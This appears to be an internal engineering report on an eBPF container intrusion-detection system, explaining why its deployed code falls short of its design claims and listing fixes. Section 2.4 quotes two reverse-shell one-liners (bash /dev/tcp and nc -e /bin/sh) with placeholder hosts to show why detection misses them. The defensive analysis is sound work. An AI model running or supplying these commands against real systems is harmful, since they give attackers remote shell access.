# CausalTrace — Architecture State Report

**Date:** 2026-04-18
**Purpose:** Reconcile the design doc (`CausalTrace_Definitive_Architecture_vFinal.md`) with what the deployed code actually does, and explain why the current marathon results are weak.

---

## 1. What the design doc claims

| Claim | Mechanism |
|-------|-----------|
| Sub-5μs kernel kill on all 5 handler types | `bpf_send_signal(9)` in every handler |
| Multi-container sheaf Laplacian detects lateral movement | 13-edge CCA graph, Rayleigh quotient with μ+4σ threshold |
| Two-hop detection kills cross-container attacks | Probe B (tcp_v4_connect) + behavior-bit chain |
| Zero enforcement FPR on clean traffic | Compound confirmation before kill |
| Evasion resistance against syscall-masking | Renyi entropy + bigram CMS with noise filter |
| Better latency than Falco (30 ms) and Tetragon (0.2 ms) | In-kernel enforcement, no userspace round-trip |

---

## 2. What the deployed code actually does

The BCC loader (`loader.py`) compiles `kernel/causaltrace_bcc.c` — a single-file C program — and attaches it. The *modular* handlers in `kernel/handler_*.bpf.c` are reference implementations that are **not loaded**.

### 2.1 Enforcement disparity

In the deployed BCC code:

| Handler | Enforcement function | Result |
|---------|---------------------|--------|
| Fork bomb (S4) | `immediate_kill()` → `bpf_send_signal(9)` | ✅ Kills |
| dup2 fd-redirect (S2b subset) | `immediate_kill()` | ✅ Kills |
| execve / shell spawn (S2a) | `alert_only()` | ❌ No-op |
| Sensitive file (S3) | `alert_only()` | ❌ No-op |
| Privilege escalation (S5, S6) | `alert_only()` | ❌ No-op |
| Two-hop / cross-container (S7) | `alert_only()` | ❌ No-op |

`alert_only()` emits to the ring buffer and returns. The kill never happens in kernel. Everything defers to Tier 3 for decision.

**Result:** Only 2 of 5 claimed handler kills are real. The "sub-5μs kill" claim applies to fork bomb and dup2-socket-redirect only.

### 2.2 Sheaf calibration is a 2-edge graph, not 13

`calibrate.py` fits CCA with `k=50` components per edge, which requires ≥60 aligned signal windows per edge. Only 2 of 13 observed edges accumulated enough simultaneous data:

- `17889 → 18749` (notification → kafka)
- `17975 → 18405` (order → inventory)

The remaining 11 edges were skipped. The "multi-container sheaf Laplacian" runs on a 2-edge graph. This is not a meaningful graph.

### 2.3 Rayleigh quotient stuck at ~18,469

The restriction maps reference cgroup IDs 17889 and 17975 (calibration testbed). The marathon uses a 20-container production testbed with different cgroup IDs. The restriction maps see uncalibrated signals → permanent residual → Rayleigh ≈ 18,469 for 598/604 verdict cycles. This is not detection; it's a calibration/testbed mismatch.

### 2.4 Reverse shell handlers never fire

The dup2 handler catches `dup2(socket_fd, 0/1/2)` — Python-style revshells. But:

- S2a (bash revshell) uses `bash -i >& /dev/tcp/host/port` — no dup2 syscall, uses `open("/dev/tcp/...")` + shell built-in redirection
- S2b fallback uses BusyBox `nc -e /bin/sh host port` — also no dup2

The marathon fired **zero** REVERSE_SHELL or FD_REDIRECT alerts across 150 attacks.

### 2.5 Enforcement targets the wrong entity

Every enforcement path calls `bpf_send_signal(9)` against the current process — i.e., it kills the container's workload. In a production deployment with legitimate end users also hitting the same container, this kills the container process regardless of whether the event came from a user or an attacker. There is **no attacker/user differentiation**.

The correct target is the attacker's TCP session, not the container. The current code has no mechanism for this.

---

## 3. Why the marathon results look weak

| Figure | Root cause |
|--------|------------|
| Tier breakdown (Fig 7) | Only 3 of 8 scenarios fired T1 alerts (S3, S5, S6). S2a/S2b/S4/S7/S8 dropped to zero because their handlers don't exist as real enforcement paths. |
| Energy timeline (Fig 1) | First-10-minute spikes are the inventory-container warmup artifact, not attacks. Subsequent flat line = Rayleigh stuck. |
| FPR figure (Fig 6) | 100% observation FPR is from the 2 permanently-miscalibrated edges, not real anomalies. |
| Latency CDF (Fig 5) | CT T1 shows zero samples because most handlers don't emit a kill event. Falco tuned at ~30 ms looks better than CT in the figure. |
| Heatmap (Fig 4) | Only 4 cells lit because only 2 edges × 2 lags have calibration data. |
| PCA scatter (Fig 3) | 11,960 "CRITICAL" points from the stuck Rayleigh drown out real signal. |

None of the figures demonstrate the design doc's actual claims. The results prove the *implementation* is broken, not that the *architecture* is wrong.

---

## 4. The architectural gaps to close

### 4.1 Enforcement
- All 8 handlers must have a real kill path.
- Kill must target the attacker's TCP session, not the container process.
- Compound confirmation required before kill: one behavior bit = alert, two-hop or IP-untrusted = kill.

### 4.2 Calibration
- Reduce CCA `k` from 50 → 15 so minimum samples drop from 60 to ~25.
- Run calibration on the SAME testbed as evaluation (no cgroup ID drift).
- Generate synthetic inter-container traffic during calibration so all 13 edges accumulate data.

### 4.3 IP trust differentiation
- New BPF map `client_trust[client_ip_u32] → trust_level_u8`.
- New BPF map `connection_context[sock_ptr] → {client_ip, cgroup, trust_level}`.
- Trusted IPs populated during calibration (any client that completes a legitimate transaction).
- Untrusted/new IPs → escalation-eligible.

### 4.4 Threshold adaptation (guarded EMA)
- Problem: naive EMA updates during attack windows → threshold rises → masks attack.
- Fix: freeze `τ_t = τ_{t-1}` whenever any behavior bit is set or any alert is active. Only update `τ_t = α R_t + (1-α) τ_{t-1}` during pristine 30-second windows.
- α = 0.02 (slow adaptation, ~25-minute half-life).

### 4.5 Attack coverage
- Current: S1–S7 (6 real attacks + normal). S8 script doesn't exist.
- Needed: 6 stateless (S2a, S2b, S3, S4, S5, S6) + 4 chains (S7 cross-container, S8 Log4Shell-style, S9 SSRF→RCE, S10 container escape). 10 types × 15 injections = 150 attacks.

### 4.6 Operational stability
- Log rotation: loader.log / verdicts.jsonl / signals.jsonl caps with rotate=3.
- Disk pre-flight: ≥10 GB free before run.
- Cgroup ID snapshot at start; abort run if any monitored container restarts.
- BPF pinning to `/sys/fs/bpf/` so loader restart preserves state.
- Watchdog heartbeat: sheaf detector emits to `/tmp/ct_heartbeat` every 5s; supervisor restarts if stale.
